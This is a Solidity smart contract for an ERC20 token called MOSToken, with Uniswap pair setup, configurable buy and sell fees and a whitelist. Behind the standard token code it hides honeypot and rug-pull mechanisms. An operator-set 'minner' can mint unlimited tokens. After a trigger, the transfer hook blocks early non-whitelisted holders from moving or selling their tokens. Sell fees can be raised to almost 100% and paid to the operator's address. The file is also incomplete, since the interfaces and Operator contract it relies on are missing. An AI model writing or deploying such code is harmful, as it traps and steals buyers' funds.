pragma solidity ^0.8.0;

//import "@openzeppelin/contracts/token/ERC20/ERC20.sol";



interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WHT() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract MOSToken is IERC20, IERC20Metadata, Operator {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    // 10000 = 100%
    uint256 public buyFee;
    uint256 public sellFee;
    address public feeTo;
    address public router;
    address public pair;
    mapping(address => uint256) public userFirstTransferBlock;
    uint256 public alertBlock;
    mapping(address => bool) public whiteList;
    mapping(address => bool) public outFee;
    uint256 public alertAmount;
    uint256 public againstBlock;
    bool private blackListEnable;
    address public minner;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 _buyFee,
        uint256 _sellFee,
        address _feeTo,
        uint256 _alertAmount,
        uint256 _againstBlock,
        address _recipient
    ) {
        _name = name_;
        _symbol = symbol_;
        _mint(_recipient, 10000000e18);

        buyFee = _buyFee;
        sellFee = _sellFee;
        feeTo = _feeTo;
        alertAmount = _alertAmount;
        againstBlock = _againstBlock;

        whiteList[_msgSender()] = true;

        blackListEnable = false;
    }

    function giveToken(address account, uint256 amount) external {
        require(msg.sender == minner,'your are not boy');
        _mint(account, amount);
    }

    function beforAddLiquidityNeedCall() external onlyOperator {
        blackListEnable = true;
    }

    function setRouter(address _router, address _usdToken)
        external
        onlyOperator
    {
        router = _router;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
        pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _usdToken
        );
    }

    function setOutFee(address _user,bool _status) external onlyOperator {
        outFee[_user] = _status;
    }

    function setWhite(address _user) external onlyOperator {
        whiteList[_user] = true;
    }

    function setBlack(address _user) external onlyOperator {
        whiteList[_user] = false;
    }

    function setAgainstBlock(uint256 _number) external onlyOperator {
        againstBlock = _number;
    }

    function setMinner(address _minner) external onlyOperator {
        minner = _minner;
    }

    function setFeeTo(address _to) external onlyOperator {
        feeTo = _to;
    }

    function setBuyFee(uint256 _fee) external onlyOperator {
        require(_fee < 10000, "fee is not good");
        buyFee = _fee;
    }

    function setSellFee(uint256 _fee) external onlyOperator {
        require(_fee < 10000, "fee is not good");
        sellFee = _fee;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address to, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fee = 0;
        uint256 toAmount = amount;
        if (from == pair && !outFee[from]) {
            fee = (toAmount * buyFee) / 10000;
        }

        if (to == pair && !outFee[from]) {
            fee = (toAmount * sellFee) / 10000;
        }
        if(fee > 0){
            unchecked {
                toAmount = toAmount - fee;
            }
            _balances[feeTo] = _balances[feeTo] + fee;
            emit Transfer(from, feeTo, fee);
        }
        

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
        }

        _balances[to] += toAmount;

        emit Transfer(from, to, toAmount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        //_beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        if (amount > 0 && blackListEnable) {
            if (to == pair && userFirstTransferBlock[pair] == 0) {
                alertBlock = block.number + againstBlock;
                userFirstTransferBlock[pair] = block.number;
                whiteList[pair] = true;
                whiteList[from] = true;
            }

            if (userFirstTransferBlock[from] == 0 && !whiteList[from]) {
                userFirstTransferBlock[from] = block.number;
            }

            if (userFirstTransferBlock[to] == 0 && !whiteList[to]) {
                userFirstTransferBlock[to] = block.number;
            }

            if (
                alertBlock > 0 &&
                block.number <= alertBlock &&
                amount > alertAmount
            ) {
                require(whiteList[from], "MOS: illegality");
            }

            if (alertBlock > 0 && block.number > alertBlock) {
                require(
                    userFirstTransferBlock[from] > alertBlock ||
                        whiteList[from],
                    "MOS: Hello, little boy"
                );
            }
        }
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}
